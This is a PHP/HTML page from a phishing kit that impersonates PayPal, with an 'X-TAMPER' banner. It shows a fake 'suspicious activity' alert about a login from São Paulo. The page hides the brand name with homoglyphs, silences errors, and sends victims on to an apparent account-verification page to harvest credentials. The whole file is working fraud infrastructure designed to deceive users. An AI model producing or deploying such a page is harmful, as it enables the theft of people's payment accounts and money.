<?php

/**
                                                                             
                                                                             
                                                                             
$$\   $$\     $$$$$$$$\  $$$$$$\  $$\      $$\ $$$$$$$\  $$$$$$$$\ $$$$$$$\  
$$ |  $$ |    \__$$  __|$$  __$$\ $$$\    $$$ |$$  __$$\ $$  _____|$$  __$$\ 
\$$\ $$  |       $$ |   $$ /  $$ |$$$$\  $$$$ |$$ |  $$ |$$ |      $$ |  $$ |
 \$$$$  /$$$$$$\ $$ |   $$$$$$$$ |$$\$$\$$ $$ |$$$$$$$  |$$$$$\    $$$$$$$  |
 $$  $$< \______|$$ |   $$  __$$ |$$ \$$$  $$ |$$  ____/ $$  __|   $$  __$$< 
$$  /\$$\        $$ |   $$ |  $$ |$$ |\$  /$$ |$$ |      $$ |      $$ |  $$ |
$$ /  $$ |       $$ |   $$ |  $$ |$$ | \_/ $$ |$$ |      $$$$$$$$\ $$ |  $$ |
\__|  \__|       \__|   \__|  \__|\__|     \__|\__|      \________|\__|  \__|
                                                                             
                                                                             
                                                                             
**/

error_reporting(0);
session_start();
ob_start();
set_time_limit(0);
include('../not.php');
require "../data/algo.php";

?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="application-name" content="PayPal">
<meta name="msapplication-task" content="../myaccount/img/pp32.png">
<link rel="shortcut icon" href="../myaccount/img/pp32.png">
<link rel="apple-touch-icon" href="../myaccount/img/apple-touch-icon.png">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
<title>Suspicious Activities - PɑyPɑl</title>
<link rel="stylesheet" href="./files/app.css">
<script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="app" src="./files/app.js"></script>
<script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="config" src="./files/config.js"></script>
<script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="view/s12n/ato/activity" src="./files/activity.js"></script>
</head>
<body>

<div class="grey-background header-body">
<div id="header">
	<div class="container-fluid center-block-big">
		<table>
			<tbody>
				<tr>
					<td>
						<a href="#"><img src="./files/logo_paypal_106x29.png" width="106" height="29" alt="PayPal"></a>
					</td>
					<td align="right" width="100%"></td>
				</tr>
			</tbody>
		</table>
	</div>
</div>
<div id="wrapper" class="page-container" role="main">
<div class="container-fluid trayNavOuter activity-tray activity-tray-large">
	<div class="trayNavInner">
		<div class="row row-ie">
			<div class="col-md-5 logo-block">
				<div class="row">
				<div class="col-md-12 peek-shield">
				<img src="./files/peek-shield-logo.png"></div>
				</div>
				<div class="row">
				<div class="col-md-12">
				<p class="logo-block-text">Your security is our priority. Hence, we regularly look for early signs of suspicious activity.</p>
				</div>
				</div>
			</div>
			<div class="col-md-7 explanation-wrapper">
				<div class="row">
					<div class="col-md-12">
						<header>
							<h4 class="flat-large-header"> We're concerned about potential unauthorised activity </h4>
						</header>
					</div>
				</div>
				<div class="row">
					<div class="col-md-12 explanation-block">
					<p>After you confirm your identity, we'll show you how to make your account more secure.</p>
					</div>
				</div>
				<div class="row">
					<div class="col-md-12"
						<div class="report-activity-tray">
							<div class="activities details-box">
								<div class="header row no-transactions white-header">
								<label class="login-wrapper">
									<span class="device">Login from unknown device</span>
									<span class="location span">near São Paulo, BR</span>
									<span class="time span"><?php echo Get_Activity_Date() ?></span>
								</label>
								</div>
							</div>
						</div>
						<p>For your own safety, we want to make sure that this is your account.</p>
						<div class="buttons requirejs-wait">
							<a class="btn btn-primary button" href='../myaccount/index.php?restore-id=<?php echo sha1(md5(gmdate("ok bye")))."_&Access-id=".strtoupper(sha1(256));?>'>Continue</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
</div> 
</div>
</div>
<script src="./files/require-spinner.js"></script>
<script>RequireSpinners.activate();</script>
<script data-main="https://www.paypalobjects.com/web/res/9ee/1202e2fd95aae52897c7f75a14f71/js/app" src="./files/require.js"></script>
<script>require(['app', 'config'], function() {require(['jquery'], function($) {var viewName = 'view/s12n&#x2F;ato&#x2F;activity'.replace(/&#x2F;/g,'/');require([viewName], function(view) {console.log(viewName + ' loaded.');RequireSpinners && RequireSpinners.stop();}, function(err) {console.log('Couldn\'t load JS associated with s12n&#x2F;ato&#x2F;activity, may not exist');console.log(err);RequireSpinners && RequireSpinners.stop();});});});</script>
<script></script>
<footer class="footer">
	<div class="footer-nav">
		<div class="site-links container-fluid" style="align: right">
			<ul class="navlist">
				<li>
					<a href="#">Contact</a>
				</li>
				<li>
					<a href="#">Security</a>
				</li>
				<li>
					<a href="../signin.php">Log Out</a>
				</li>
			</ul>
		</div>
	</div>
	<div class="footer-legal">
		<div class="container-fluid">
			<span class="copyright">Copyright © 1999-2017 PɑyPɑl. All rights reserved.</span>
			<span class="short-copyright">© 1999-2017</span>
			<ul class="navlist footer-list">
				<li>
					<a href="#">Privacy</a>
				</li>
				<li>
					<a href="#">Legal</a>
				</li>
			</ul>
		</div>
	</div>
</footer>
<script type="text/javascript" src="./files/pp_jscode_080706.js"></script>
<script src="./files/pa.js"></script>

</body>
</html>